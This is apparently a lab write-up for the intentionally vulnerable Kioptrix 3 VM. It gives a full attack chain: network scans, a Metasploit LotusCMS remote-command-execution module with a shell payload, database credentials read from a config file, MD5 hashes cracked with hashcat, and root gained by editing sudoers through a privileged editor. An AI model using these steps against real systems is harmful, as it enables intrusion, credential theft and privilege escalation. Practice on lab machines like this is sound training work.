### Solved using without Metasploit

Let scan for kioptrix 3 machine , solved using Metasploit

Ping Scan

```
sudo nmap -sn 192.168.69.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 21:45 CDT
Nmap scan report for 192.168.69.1
Host is up (0.00013s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.69.2
Host is up (0.00010s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.69.3
Host is up (0.00011s latency).
MAC Address: 08:00:27:D7:FC:16 (Oracle VirtualBox virtual NIC)
Nmap scan report for kioptrix3.com (192.168.69.9)  <<<<<<<<<<<<
Host is up (0.00023s latency).
MAC Address: 08:00:27:AC:33:02 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.5
```

we know that machine running on `192.168.69.9`

<img src="../img/Pasted image 20240623081743.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240623081822.png" alt="Example Image" width="1080"/>
<img src="../img/Pasted image 20240623081851.png" alt="Example Image" width="1080"/>

we got the login with LotusCMS - it is a content management system built using PHP

<img src="../img/Pasted image 20240623082055.png" alt="Example Image" width="1080"/>

Let explore `/gallery` path , so we have to set name for the machine ip in `/etc/hosts`

<img src="../img/Pasted image 20240623082210.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240623082324.png" alt="Example Image" width="1080"/>

Let , recon using `nmap -AF 192.168.69.9` , -AF refer Aggressive and Fast scan

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 21:54 CDT
Nmap scan report for kioptrix3.com (192.168.69.9)
Host is up (0.00021s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
MAC Address: 08:00:27:AC:33:02 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms kioptrix3.com (192.168.69.9)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

let search for LotusCMS in Metasploit

```
sudo msfconsole

search LotusCMS
0  exploit/multi/http/lcms_php_exec  2011-03-03 excellent Yes LotusCMS 3.0 eval() Remote Command Execution
use 0

show options
Name     Current Setting  Required  Description
RHOSTS                    yes       The target host(s), see
RPORT    80               yes       The target port (TCP)
URI      /lcms/           yes       URI

set rhost 192.168.69.9
set uri /
set payload generic/shell_bind_tcp
set LPORT  4444

# In another terminal start the listerner
sudo nc -lvnp 4444

# In msfconsole terminal
run
whoami
www-data
python -c "import pty; pty.spawn('/bin/bash');"

www-data@Kioptrix3:/home/www/kioptrix3.com$
cd ../../
ls
dreg  loneferret  www

cd loneferret
ls
CompanyPolicy.README  checksec.sh

cat CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO

sudo ht # asking passoword
```

We know it's running on php , let explore its config for further enumeration

<img src="../img/Pasted image 20240623084838.png" alt="Example Image" width="1080"/>

```
cd ..
ls
dreg  loneferret  www
cd www

ls
kioptrix3.com
cd kioptrix3.com

ls
cache  data         gallery       index.php  style
core   favicon.ico  gnu-lgpl.txt  modules    update.php

cd gallery
ls
BACK         gfooter.php     logout.php        readme.html    tags.php
db.sql       gfunctions.php  p.php             recent.php     themes
g.php        gheader.php     photos            register.php   version.txt
gadmin       index.php       photos.php        scopbin        vote.php
gallery.php  install.BAK     post_comment.php  search.php
gconfig.php  login.php       profile.php       slideshow.php

cat gconfig.php
```

<img src="../img/Pasted image 20240623085256.png" alt="Example Image" width="1080"/>

we got creds for mysql database , directory travasal recon `sudo dirb http://192.168.69.9`

<img src="../img/Pasted image 20240623085556.png" alt="Example Image" width="1080"/>
Give the login credentials

<img src="../img/Pasted image 20240623085626.png" alt="Example Image" width="1080"/>

Explored the Table page , noted a table called `dev-accounts`,so view the dev-accounts table
<img src="../img/Pasted image 20240623085704.png" alt="Example Image" width="1080"/>
We got a two hashed

```
	dreg  0d3eccfb887aabd50f243b3f155c0f85
	loneferret 5badcaf789d3d1d09794d8f021f40f0e
```

https://www.tunnelsup.com/hash-analyzer/

<img src="../img/Pasted image 20240623085900.png" alt="Example Image" width="1080"/>

We know it's a MD5 Hash, let start a dictionary attack by hashcat

We have alternate solution called cracking station site on online but we stick to hashcat here

Rockyou.txt file has a bunch of common password
https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

<img src="../img/Pasted image 20240623090718.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240623090726.png" alt="Example Image" width="1080"/>

```
# Note
hashcat -a <$attack mode> -m <$hash_algorithm> <$hash> <$dictionary>
-m 0 refers mode 0 MD5
-a 0 refers attatckmode 0 straight

hashcat.exe -m 0 -a 0 "0d3eccfb887aabd50f243b3f155c0f85" rockyou.txt
#we cracked  hash
0d3eccfb887aabd50f243b3f155c0f85:Mast3r

hashcat.exe -m 0 -a 0 --show "5badcaf789d3d1d09794d8f021f40f0e" rockyou.txt
#we cracked  hash
5badcaf789d3d1d09794d8f021f40f0e:starwars
```

let assume that , it to be ssh credentials, but got a no match host key type error

Fix link
https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss

```
ssh loneferret@192.168.69.9
Unable to negotiate with 192.168.69.9 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

sudo nano /etc/ssh/ssh_config.d/my.conf
#paste this in my.conf
HostKeyAlgorithms ssh-rsa,ssh-dss
PubkeyAcceptedKeyTypes ssh-rsa,ssh-dss
```

```
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
export TERM=xterm
sudo ht
```

<img src="../img/Pasted image 20240623091558.png" alt="Example Image" width="1080"/>

Hit F3 and type the path

<img src="../img/Pasted image 20240623091755.png" alt="Example Image" width="1080"/>

edit user privilege , add `/bin/bash` to loneferret with nopasswd , F2 to save , ctrl + c to exit window

<img src="../img/Pasted image 20240623091907.png" alt="Example Image" width="1080"/>

```
sudo /bin/bash
root@Kioptrix3:~#
root@Kioptrix3:~# cd /root/
root@Kioptrix3:/root# ls
Congrats.txt  ht-2.0.18
root@Kioptrix3:/root# cat Congrats.txt
```

```
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS:
http://www.lotuscms.org

Gallery application:
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```
